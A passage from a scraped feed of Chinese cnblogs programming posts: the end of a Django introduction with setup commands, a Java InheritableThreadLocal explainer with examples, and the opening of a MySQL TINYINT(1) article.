给你一块地和一些基础建材（路由、模板引擎），店怎么盖、用什么砖瓦，你说了算。高度自由，但一砖一瓦都得自己操心。</p>\n<p> - <code style=\"color: rgba(186, 55, 42, 1);\">FastAPI</code> 则像一家专注做“外卖/API配送”的现代化中央厨房，自动化程度高，性能出色，但主要精力在高效处理“订单”（请求）和生成“餐品”（JSON响应）。</p>\n<p> - 而 <code style=\"color: rgba(186, 55, 42, 1);\">Django</code>，就像一家提供“精装修酒店式公寓”的开发商。从房间布局（MVC/MTV架构）、水电管路（ORM数据库操作）、前台管理系统（Admin后台），甚至门禁安保（用户认证）都给你配好了。你只需专注经营你的“酒店特色服务”（业务逻辑）。</p>\n</div>\n<p>这就是Django著名的 <strong>“电池内置”</strong> 哲学。它不适合所有场景，但当你需要快速构建一个功能完整、管理后台健全、安全性有保障的内容驱动型网站（如新闻站、博客平台、企业内部管理系统）时，它能极大提升你的开发效率。</p>\n<h2>⚖️ 第二部分：Django vs FastAPI vs Flask，怎么选？</h2>\n<p>用一个表格太冰冷，我用三个比喻来总结：</p>\n<div>\n<p> 🏢 <strong>Django (精装公寓)</strong></p>\n<p>  - <strong>优势</strong>：开箱即用，功能全面（ORM、Admin、Auth、缓存等），文档极其完善，社区庞大，安全性高（默认防CSRF、SQL注入等）。适合中大型、需求明确、需要快速上手的项目。</p>\n<p>  - <strong>不足</strong>：灵活性相对较低，“船舵”较大，对于微小API或极高并发、定制化极致的场景可能显得“重”。</p>\n<br />\n<p> 🚀 <strong>FastAPI (高性能中央厨房)</strong></p>\n<p>  - <strong>优势</strong>：异步支持好，性能顶尖，自动生成交互式API文档，数据类型校验强（基于Pydantic）。是现代微服务、纯API后端、实时应用的首选。</p>\n<p>  - <strong>不足</strong>：生态系统相比Django仍处于成长阶段，很多“精装修”功能需要自己或第三方库搭建。</p>\n<br />\n<p> 🧱 <strong>Flask (毛坯房+自选建材)</strong></p>\n<p>  - <strong>优势</strong>：极度轻量灵活，学习曲线平缓。你可以从零开始，按需添加任何扩展（数据库用SQLAlchemy，表单用WTForms）。适合微小型项目、学习Web原理，或架构需要高度定制的场景。</p>\n<p>  - <strong>不足</strong>：初始配置决策多，需要开发者自己组合拼装，项目结构容易因人而异。</p>\n</div>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">核心结论：没有最好，只有最合适。要快速建站选Django，要做API服务选FastAPI，要极致灵活/学习底层选Flask。</strong></p>\n<h2>🔧 第三部分：动手！安装并创建你的第一个Django项目</h2>\n<p>理论说完，我们来点实在的。请确保已安装Python（建议3.8以上）。</p>\n<h3>🎯 步骤一：安装Django</h3>\n<p>强烈建议使用虚拟环境，避免包冲突。打开你的终端（命令行）：</p>\n<pre class=\"language-bash highlighter-hljs\"><code># 1. 创建并进入一个项目目录\nmkdir my_first_django_site\ncd my_first_django_site\n\n# 2. 初始化虚拟环境\nuv init\n\n# 3. 安装Django\nuv add django</code></pre>\n<h3>🎯 步骤二：创建项目和应用程序</h3>\n<p>在Django中，<code style=\"color: rgba(186, 55, 42, 1);\">项目</code> 是你的整个网站容器，而 <code style=\"color: rgba(186, 55, 42, 1);\">应用</code> 是网站内的功能模块（如博客应用、用户应用）。</p>\n<pre class=\"language-bash highlighter-hljs\"><code># 创建名为 ‘mysite‘ 的项目\nuv run django-admin startproject mysite .\n\n# 注意最后的点‘.‘，它表示在当前目录创建，避免嵌套两层目录。\n# 现在目录结构类似：\n# my_first_django_site/\n#   ├── manage.py      # 项目管理命令行工具\n#   ├── mysite/        # 项目配置目录\n#   │   ├── __init__.py\n#   │   ├── settings.py # 项目所有设置（数据库、应用等）\n#   │   ├── urls.py     # 项目级别的URL路由\n#   │   └── wsgi.py\n#   └── .venv/\n#   └── pyproject.toml\n#   └── uv.lock\n\n# 创建一个名为 ‘blog‘ 的应用\nuv run manage.py startapp blog\n\n# 创建后，多了一个 blog/ 目录，里面包含了模型、视图等文件。</code></pre>\n<h3>🎯 步骤三：让项目“动”起来</h3>\n<p>首先，我们需要将新建的应用注册到项目中。编辑 <code style=\"color: rgba(186, 55, 42, 1);\">mysite/settings.py</code> 文件：</p>\n<pre class=\"language-ini highlighter-hljs\"><code># 找到 INSTALLED_APPS 列表，在末尾添加 ‘blog‘\nINSTALLED_APPS = [\n    ‘django.contrib.admin‘,\n    ‘django.contrib.auth‘,\n    ... # 其他默认应用\n    ‘blog‘, # &lt;-- 添加这一行\n]</code></pre>\n<p>然后，进行数据库迁移（Django默认使用SQLite，无需额外安装）：</p>\n<pre class=\"language-bash highlighter-hljs\"><code># 生成迁移文件（根据模型创建数据库表的蓝图）\nuv run manage.py makemigrations\n\n# 执行迁移，在数据库中创建表\nuv run manage.py migrate</code></pre>\n<p>最后，创建超级用户（用于登录强大的Admin后台）并运行开发服务器：</p>\n<pre class=\"language-bash highlighter-hljs\"><code># 创建超级用户，按提示输入用户名、邮箱和密码\nuv run manage.py createsuperuser\n\n# 启动开发服务器，默认监听 127.0.0.1:8000\nuv run manage.py runserver</code></pre>\n<p>现在，打开浏览器访问：</p>\n<div>\n<p> 👉 <a href=\"http://127.0.0.1:8000/\" rel=\"noopener nofollow\">http://127.0.0.1:8000/</a> - 你会看到Django的“火箭”欢迎页！恭喜，项目已运行。</p>\n<p> 👉 <a href=\"http://127.0.0.1:8000/admin/\" rel=\"noopener nofollow\">http://127.0.0.1:8000/admin/</a> - 用刚才创建的超级用户登录，你将进入功能强大的Admin后台，可以管理用户、组等（未来你的博客文章模型注册后也能在这里管理）。</p>\n</div>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">看，不到10条命令，一个具备完整后台管理、用户认证、数据库ORM的Web应用骨架就立起来了。这就是Django“电池内置”的魅力。</strong></p>\n<h2>⚠️ 第四部分：一些重要的提醒</h2>\n<div>\n<p> 1️⃣ <strong>学习曲线</strong>：Django入门看似简单，但其MTV模式和“约定优于配置”的思想需要时间消化。别怕，官方教程是神作，请务必过一遍。</p>\n<p> 2️⃣ <strong>性能</strong>：对于绝大多数应用，Django默认性能足够。遇到真正的高并发瓶颈时，再考虑缓存、异步视图、甚至结合FastAPI做微服务，<strong>不要过早优化</strong>。</p>\n<p> 3️⃣ <strong>不要修改内置应用</strong>：Django自带的<code style=\"color: rgba(186, 55, 42, 1);\">auth</code>, <code style=\"color: rgba(186, 55, 42, 1);\">admin</code>等应用代码不要直接改，通过继承和覆盖来扩展功能。</p>\n<p> 4️⃣ <strong>调试工具</strong>：安装<code style=\"color: rgba(186, 55, 42, 1);\">django-debug-toolbar</code>，它是开发阶段查看SQL查询、性能的神器。</p>\n</div>\n<hr />\n<p style=\"text-align: center;\">---<strong>写在最后</strong>---<br />希望这份总结能帮你避开一些坑。如果觉得有用，不妨点个 赞👍 或 收藏⭐ 标记一下，方便随时回顾。也欢迎关注我，后续为你带来更多类似的实战解析。有任何疑问或想法，我们评论区见，一起交流开发中的各种心得与问题。</p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-19 11:36</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ymtianyu\">一名程序媛呀</a>&nbsp;\n阅读(<span id=\"post_view_count\">1</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "InheritableThreadLocal，从入门到放弃",
      "link": "https://www.cnblogs.com/sevencoding/p/19484504",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sevencoding/p/19484504\" id=\"cb_post_title_url\" title=\"发布于 2026-01-19 09:00\">\n    <span>InheritableThreadLocal，从入门到放弃</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>InheritableThreadLocal相比ThreadLocal多一个能力：在创建子线程Thread时，子线程Thread会自动继承父线程的InheritableThreadLocal信息到子线程中，进而实现在在子线程获取父线程的InheritableThreadLocal值的目的。</p>\n<p>关于ThreadLocal详细内容，可以看这篇文章：<a href=\"https://mp.weixin.qq.com/s?__biz=MzkwNjc0MzU1Mg==&amp;mid=2247484942&amp;idx=1&amp;sn=7e414e401be057e6bf8dde163d9387d9&amp;chksm=c0e29c61f7951577a7f1f037fa5ee68c445116b6e0de82ca4321fe18d66de6fea8d33cbdc232&amp;token=1187469911&amp;lang=zh_CN#rd\" rel=\"noopener nofollow\" target=\"_blank\">史上最全ThreadLocal 详解</a></p>\n<h2 id=\"和-threadlocal-的区别\">和 ThreadLocal 的区别</h2>\n<p>举个简单的栗子对比下InheritableThreadLocal和ThreadLocal：</p>\n<pre><code class=\"language-java\">public&nbsp;class&nbsp;InheritableThreadLocalTest&nbsp;{&nbsp; &nbsp;&nbsp;\n\tprivate&nbsp;static&nbsp;final ThreadLocal&lt;String&gt; threadLocal =&nbsp;new&nbsp;ThreadLocal&lt;&gt;();&nbsp; &nbsp;&nbsp;\n\tprivate&nbsp;static&nbsp;final InheritableThreadLocal&lt;String&gt; inheritableThreadLocal =&nbsp;new&nbsp;InheritableThreadLocal&lt;&gt;();&nbsp; &nbsp;&nbsp;\n\n\tpublic&nbsp;static&nbsp;void&nbsp;main(String[]&nbsp;args)&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp; \n\t\ttestThreadLocal();&nbsp; &nbsp; &nbsp; &nbsp; \n\t\ttestInheritableThreadLocal();&nbsp; &nbsp; \n\t}&nbsp; &nbsp;&nbsp;\n\n\t/**&nbsp; &nbsp; &nbsp;* threadLocal测试&nbsp; &nbsp; &nbsp;*/&nbsp; &nbsp;&nbsp;\n\tpublic&nbsp;static&nbsp;void&nbsp;testThreadLocal()&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;\n\t\t&nbsp;// 在主线程中设置值到threadLocal&nbsp; &nbsp; &nbsp; &nbsp; \n\t\t&nbsp;threadLocal.set(\"我是父线程threadLocal的值\");&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t&nbsp;// 创建一个新线程并启动&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t&nbsp;new&nbsp;Thread(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t\t\t&nbsp;// 在子线程里面无法获取到父线程设置的threadLocal，结果为null&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n\t\t\t\t&nbsp;System.out.println(\"从子线程获取到threadLocal的值: \"&nbsp;+ threadLocal.get());&nbsp; &nbsp; &nbsp; &nbsp;    }\n\t\t&nbsp;).start();&nbsp; &nbsp; \n\t&nbsp;}&nbsp; &nbsp;&nbsp;\n&nbsp;\n\t&nbsp;/**&nbsp; &nbsp; &nbsp;* inheritableThreadLocal测试&nbsp; &nbsp; &nbsp;*/&nbsp; \n\tpublic&nbsp;static&nbsp;void&nbsp;testInheritableThreadLocal()&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t// 在主线程中设置一个值到inheritableThreadLocal&nbsp; &nbsp; &nbsp; &nbsp; \n\t\tinheritableThreadLocal.set(\"我是父线程inheritableThreadLocal的值\");&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t// 创建一个新线程并启动&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\tnew&nbsp;Thread(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t\t\t// 在子线程里面可以自动获取到父线程设置的inheritableThreadLocal&nbsp; &nbsp; \n\t\t\t\tSystem.out.println(\"从子线程获取到inheritableThreadLocal的值: \"&nbsp;+ inheritableThreadLocal.get());&nbsp; &nbsp; &nbsp; &nbsp; \n\t\t\t}).start();&nbsp; &nbsp; \n\t\t}\n\t}\n</code></pre>\n<p>执行结果：</p>\n<pre><code class=\"language-text\">从子线程获取到threadLocal的值:null\n从子线程获取到inheritableThreadLocal的值:我是父线程inheritableThreadLocal的值\n</code></pre>\n<p>可以看到子线程中可以获取到父线程设置的inheritableThreadLocal值，但不能获取到父线程设置的threadLocal值</p>\n<h2 id=\"实现原理\">实现原理</h2>\n<p>InheritableThreadLocal 的实现原理相当精妙，它通过在创建子线程的瞬间，“复制”父线程的线程局部变量，从而实现了数据从父线程到子线程的<strong>一次性、创建时</strong>的传递 。</p>\n<p>其核心工作原理可以清晰地通过以下序列图展示，它描绘了当父线程创建一个子线程时，数据是如何被传递的：</p>\n<div class=\"mermaid\">sequenceDiagram\n    participant Parent as 父线程\n    participant Thread as Thread构造方法\n    participant ITL as InheritableThreadLocal\n    participant ThMap as ThreadLocalMap\n    participant Child as 子线程\n\n    Parent-&gt;&gt;Thread: 创建 new Thread()\n    Note over Parent,Thread: 关键步骤：初始化\n    Thread-&gt;&gt;Thread: 调用 init() 方法\n    Note over Thread,ITL: 检查父线程的 inheritableThreadLocals\n    Thread-&gt;&gt;+ThMap: createInheritedMap(&lt;br/&gt;parent.inheritableThreadLocals)\n    ThMap-&gt;&gt;ThMap: 新建一个ThreadLocalMap\n    loop 遍历父线程Map中的每个Entry\n        ThMap-&gt;&gt;+ITL: 调用 key.childValue(parentValue)\n        ITL--&gt;&gt;-ThMap: 返回子线程初始值&lt;br/&gt;(默认返回父值，可重写)\n        ThMap-&gt;&gt;ThMap: 将 (key, value) 放入新Map\n    end\n    ThMap--&gt;&gt;-Thread: 返回新的ThreadLocalMap对象\n    Thread-&gt;&gt;Child: 将新Map赋给子线程的&lt;br/&gt;inheritableThreadLocals属性\n    Note over Child: 子线程拥有父线程变量的副本\n</div><p>下面我们来详细拆解图中的关键环节。</p>\n<h3 id=\"核心实现机制\">核心实现机制</h3>\n<ol>\n<li>**数据结构基础：<code>Thread</code>类内部维护了两个 <code>ThreadLocalMap</code>类型的变量 ：\n<ul>\n<li><code>threadLocals</code>：用于存储普通 <code>ThreadLocal</code>设置的变量副本。</li>\n<li><code>inheritableThreadLocals</code>：专门用于存储 <code>InheritableThreadLocal</code>设置的变量副本 。<code>InheritableThreadLocal</code>通过重写 <code>getMap</code>和 <code>createMap</code>方法，使其所有操作都针对 <code>inheritableThreadLocals</code>字段，从而与普通 <code>ThreadLocal</code>分离开 。</li>\n</ul>\n</li>\n<li><strong>继承触发时刻：子线程的创建</strong>。继承行为发生在子线程被创建（即执行 <code>new Thread()</code>）时。在 <code>Thread</code>类的 <code>init</code>方法中，如果判断需要继承（<code>inheritThreadLocals</code>参数为 <code>true</code>）<strong>且</strong>父线程（当前线程）的 <code>inheritableThreadLocals</code>不为 <code>null</code>，则会执行复制逻辑 。</li>\n<li><strong>复制过程的核心：<code>createInheritedMap</code></strong>。这是实现复制的核心方法 。它会创建一个新的 <code>ThreadLocalMap</code>，并将父线程 <code>inheritableThreadLocals</code>中的所有条目遍历拷贝到新 Map 中。\n<ul>\n<li><strong>Key的复制</strong>：Key（即 <code>InheritableThreadLocal</code>对象本身）是直接复制的引用。</li>\n<li><strong>Value的生成</strong>：Value 并非直接复制引用，而是通过调用 <code>InheritableThreadLocal</code>的 <code>childValue(T parentValue)</code>方法来生成子线程中的初始值。<strong>默认实现是直接返回父值</strong>（<code>return parentValue;</code>），这意味着对于对象类型，父子线程将共享同一个对象引用 。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"关键特性与注意事项\">关键特性与注意事项</h3>\n<ol>\n<li><strong>创建时复制，后续独立</strong>：继承只发生一次，即在子线程对象创建的瞬间。此后，父线程和子线程对各自 <code>InheritableThreadLocal</code>变量的修改互不影响 。</li>\n<li><strong>在线程池中的局限性</strong>：这是 <code>InheritableThreadLocal</code>最需要警惕的问题。线程池中的线程是复用的，这些线程在首次创建时可能已经从某个父线程继承了值。但当它们被用于执行新的任务时，新的任务提交线程（逻辑上的“父线程”）与工作线程已无直接的创建关系，因此之前继承的值不会更新，这会导致<strong>数据错乱</strong>（如用户A的任务拿到了用户B的信息）或<strong>内存泄漏</strong>​ 。对于线程池场景，应考虑使用阿里开源的 <strong>TransmittableThreadLocal (TTL)</strong>​ 。</li>\n<li><strong>浅拷贝与对象共享</strong>：由于 <code>childValue</code>方法默认是浅拷贝，如果存入的是可变对象（如 <code>Map</code>、<code>List</code>），父子线程实际持有的是同一个对象的引用。在一个线程中修改该对象的内部状态，会直接影响另一个线程 。若需隔离，可以重写 <code>childValue</code>方法实现深拷贝 。</li>\n<li><strong>内存泄漏风险</strong>：与 <code>ThreadLocal</code>类似，如果线程长时间运行（如线程池中的核心线程），并且未及时调用 <code>remove</code>方法清理，那么该线程的 <code>inheritableThreadLocals</code>会一直持有值的强引用，导致无法被GC回收。良好的实践是在任务执行完毕后主动调用 <code>remove()</code></li>\n</ol>\n<h3 id=\"线程池中局限性\">线程池中局限性</h3>\n<p>一般来说，在真实的业务场景下，没人会直接 new Thread，而都是使用线程池的，因此<code>InheritableThreadLocal</code>在线程池中的使用局限性要额外注意</p>\n<p>首先，我们先理解 <code>InheritableThreadLocal</code>的继承前提</p>\n<ul>\n<li><code>InheritableThreadLocal</code>的继承只发生在 <strong>新线程被创建时</strong>（即 <code>new Thread()</code>并启动时）。在创建过程中，子线程会复制父线程的 <code>InheritableThreadLocal</code>值。</li>\n<li>在线程池中，线程是预先创建或按需创建的，并且会被复用。因此，继承只会在线程池<strong>创建新线程</strong>时发生，而不会在复用现有线程时发生。</li>\n</ul>\n<p>再看线程池创建新线程的条件，对于标准的 <code>ThreadPoolExecutor</code>，新线程的创建遵循以下规则：</p>\n<ol>\n<li><strong>当前线程数 &lt; 核心线程数</strong>：当提交新任务时，如果当前运行的线程数小于核心线程数，即使有空闲线程，线程池也会创建新线程来处理任务。此时，新线程会继承父线程（提交任务的线程）的 <code>InheritableThreadLocal</code>。</li>\n<li><strong>当前线程数 &gt;= 核心线程数 &amp;&amp; 队列已满 &amp;&amp; 线程数 &lt; 最大线程数</strong>：当任务队列已满，且当前线程数小于最大线程数时，线程池会创建新线程来处理任务。同样，新线程会继承父线程的 <code>InheritableThreadLocal</code>。</li>\n</ol>\n<p>不会继承的场景</p>\n<ul>\n<li><strong>线程复用</strong>：当线程池中有空闲线程时（例如，当前线程数 &gt;= 核心线程数，但队列未满），任务会被分配给现有线程执行。此时，没有新线程创建，因此不会发生继承。现有线程的 <code>InheritableThreadLocal</code>值保持不变（可能是之前任务设置的值），这可能导致数据错乱（如用户A的任务看到用户B的数据）。</li>\n<li><strong>线程数已达最大值</strong>：如果线程数已达最大线程数，且队列已满，新任务会被拒绝（根据拒绝策略），也不会创建新线程，因此不会继承。</li>\n</ul>\n<p>不只是线程池污染，线程池使用 <code>InheritableThreadLocal</code> 还可能存在获取不到值的情况。例如，在执行异步任务的时候，复用了某个已有的线程A，并且当时创建该线程A的时候，没有继承InheritableThreadLocal，进而导致后面复用该线程的时候，从InheritableThreadLocal获取到的值为null：</p>\n<pre><code class=\"language-java\">public&nbsp;class&nbsp;InheritableThreadLocalWithThreadPoolTest&nbsp;{&nbsp; &nbsp;&nbsp;\n\tprivate&nbsp;static&nbsp;final InheritableThreadLocal&lt;String&gt; inheritableThreadLocal =&nbsp;new&nbsp;InheritableThreadLocal&lt;&gt;();&nbsp; &nbsp;&nbsp;\n\t// 这里线程池core/max数量都只有2&nbsp; &nbsp;&nbsp;\n\tprivate&nbsp;static&nbsp;final ThreadPoolExecutor threadPoolExecutor =&nbsp;new&nbsp;ThreadPoolExecutor(&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t2,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t2,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t0L,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n\t\tTimeUnit.MILLISECONDS,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\tnew&nbsp;LinkedBlockingQueue&lt;Runnable&gt;(3000),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\tnew&nbsp;ThreadPoolExecutor.CallerRunsPolicy()&nbsp; &nbsp; \n\t);&nbsp; &nbsp;&nbsp;\n\t\n\tpublic&nbsp;static&nbsp;void&nbsp;main(String[]&nbsp;args)&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t// 先执行了不涉及InheritableThreadLocal的子任务初始化线程池线程&nbsp;\n\t &nbsp; &nbsp; &nbsp; testAnotherFunction();&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; testAnotherFunction();&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; // 后执行了涉及InheritableThreadLocal\n\t &nbsp; &nbsp; &nbsp; testInheritableThreadLocalWithThreadPool(\"张三\");&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; testInheritableThreadLocalWithThreadPool(\"李四\");&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; threadPoolExecutor.shutdown();&nbsp; &nbsp; \n\t }&nbsp; &nbsp;&nbsp;\n\t \n\t /**&nbsp; &nbsp; &nbsp;* inheritableThreadLocal+线程池测试&nbsp; &nbsp; &nbsp;*/&nbsp; &nbsp;&nbsp;\n\t&nbsp; &nbsp; public&nbsp;static&nbsp;void&nbsp;testInheritableThreadLocalWithThreadPool(String param)&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t&nbsp; &nbsp; // 1. 在主线程中设置一个值到inheritableThreadLocal&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; &nbsp; inheritableThreadLocal.set(param);&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; &nbsp;// 2. 提交异步任务到线程池&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; &nbsp;threadPoolExecutor.execute(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; &nbsp;// 3. 在线程池-子线程里面可以获取到父线程设置的inheritableThreadLocal吗？&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n\t\t &nbsp; &nbsp; &nbsp; &nbsp;System.out.println(\"线程名: \"&nbsp;+ Thread.currentThread().getName() +&nbsp;\", 父线程设置的inheritableThreadLocal值: \"&nbsp;+ param +&nbsp;\", 子线程获取到inheritableThreadLocal的值: \"&nbsp;+ inheritableThreadLocal.get());&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; &nbsp;});&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; &nbsp;// 4. 清除inheritableThreadLocal&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; &nbsp;inheritableThreadLocal.remove();&nbsp; &nbsp; \n\t &nbsp; }&nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; /**&nbsp; &nbsp; &nbsp;* 模拟另一个独立的功能&nbsp; &nbsp; &nbsp;*/&nbsp; &nbsp;\n\t &nbsp; public&nbsp;static&nbsp;void&nbsp;testAnotherFunction()&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t &nbsp; // 提交异步任务到线程池&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; threadPoolExecutor.execute(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; // 在线程池-子线程里面可以获取到父线程设置的inheritableThreadLocal吗？&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n\t\t &nbsp; &nbsp; &nbsp; System.out.println(\"线程名: \"&nbsp;+ Thread.currentThread().getName() +&nbsp;\", 线程池-子线程摸个鱼\");&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; });&nbsp; &nbsp; \n\t &nbsp; }\n}\n</code></pre>\n<p>执行结果：</p>\n<pre><code class=\"language-text\">线程名:pool-1-thread-2,线程池-子线程摸个鱼\n线程名:pool-1-thread-1,线程池-子线程摸个鱼\n线程名:pool-1-thread-1,父线程设置的inheritableThreadLocal值:李四，子线程获取到inheritableThreadLocal的值:null\n线程名:pool-1-thread-2,父线程设置的inheritableThreadLocal值:张三，子线程获取到inheritableThreadLocal的值:null\n</code></pre>\n<p>当然了，解决这个问题可以考虑使用阿里开源的 <strong>TransmittableThreadLocal (TTL)</strong>，​或者在提交异步任务前，先获取线程数据，再传入。例如：</p>\n<pre><code class=\"language-java\">// 1. 在主线程中先获取inheritableThreadLocal的值\nString name = inheritableThreadLocal.get();&nbsp; &nbsp; \n&nbsp; &nbsp;&nbsp;\n// 2. 提交异步任务到线程池&nbsp; &nbsp; &nbsp; &nbsp; \nthreadPoolExecutor.execute(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n// 3. 在线程池-子线程里面直接传入数据&nbsp; \nSystem.out.println(\"线程名: \"&nbsp;+ Thread.currentThread().getName() +&nbsp;\", 父线程设置的inheritableThreadLocal值: \"&nbsp;+ param +&nbsp;\", 子线程获取到inheritableThreadLocal的值: \"&nbsp;+ name);&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; &nbsp;});&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n</code></pre>\n<h2 id=\"与-threadlocal-的对比\">与 ThreadLocal 的对比</h2>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>ThreadLocal</th>\n<th>InheritableThreadLocal</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>数据隔离</strong>​</td>\n<td>线程绝对隔离</td>\n<td>线程绝对隔离</td>\n</tr>\n<tr>\n<td><strong>子线程继承</strong>​</td>\n<td><strong>不支持</strong>​</td>\n<td><strong>支持</strong>（创建时）</td>\n</tr>\n<tr>\n<td><strong>底层存储字段</strong>​</td>\n<td><code>Thread.threadLocals</code></td>\n<td><code>Thread.inheritableThreadLocals</code></td>\n</tr>\n<tr>\n<td><strong>适用场景</strong>​</td>\n<td>线程内全局变量，避免传参</td>\n<td><strong>父子线程间</strong>需要传递上下文数据</td>\n</tr>\n</tbody>\n</table>\n\n</div>\n<div id=\"MySignature\">\n    <p>本文来自在线网站：seven的菜鸟成长之路，作者：seven，转载请注明原文链接：www.seven97.top</p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-19 09:00</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sevencoding\">程序员Seven</a>&nbsp;\n阅读(<span id=\"post_view_count\">15</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "TINYINT(1) 类型的字段，明明数据存的是 2，为什么查出来是 true",
      "link": "https://www.cnblogs.com/youzhibing/p/19498073",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/youzhibing/p/19498073\" id=\"cb_post_title_url\" title=\"发布于 2026-01-19 08:58\">\n    <span>TINYINT(1) 类型的字段，明明数据存的是 2，为什么查出来是 true</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        MySQL整数类型后面的n是显示宽度，表示显示时最少占n个字符宽度，既不会限制列存储的数值范围，也不会截断比列显示宽度更宽的值；不使用TINYINT(1)，直接使用TINYINT(4)或TINYINT\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"开心一刻\">开心一刻</h2>\n<p>大学期间，跟初恋谈了一段刻骨铭心的恋情，因为某些原因，大学毕业后分手了。<br />\n如今大学毕业已经10年，听说她很早就出国了，而我，很早就成的哥了。<br />\n昨天，初恋坐上了我的的车，我一眼就认出了她，她亦如当初模样，而我却满脸沧桑。<br />\n我不敢打招呼，默默的听着她打电话，讲述着国外的种种。<br />\n快到目的地的时候，她放下了电话说：我已经把我这10年的经历都说给你听了，你连句你好都不说吗<br />\n我知道电话那头没有任何人，她是故意说给我听的，我哽咽着颤抖的说到：你好<br />\n她深情的看着我，问道：我们还回得去吗<br />\n我疑惑的望向她，说到：回去？回去可以啊，但得加钱......</p>\n<div align=\"center\"><img src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230496-740629878.gif\" /></div>\n<h2 id=\"tinyint\">TINYINT</h2>\n<p>关于 <code>TINYINT</code>，我相信大家都知道它，是数据库的一种数据类型，说的详细点，它是数据库的一种数字类型，再详细点，它是数据库的一种整数类型；需要注意的是，它并非 SQL 标准整数类型</p>\n<blockquote>\n<p>SQL标准整数类型：INTEGER<code>(or</code>INT<code>) and </code>SMALLINT</p>\n</blockquote>\n<p>而是某些数据库的拓展整数类型，所以并非所有的关系型数据库都支持 TINYINT，支持的数据库类型包括 <code>MySQL</code>、<code>MariaDB</code>、<code>SQL Server</code>；我们基于 <code>MySQL</code> 来看看 TINYINT</p>\n<p>MySQL 官方对<a 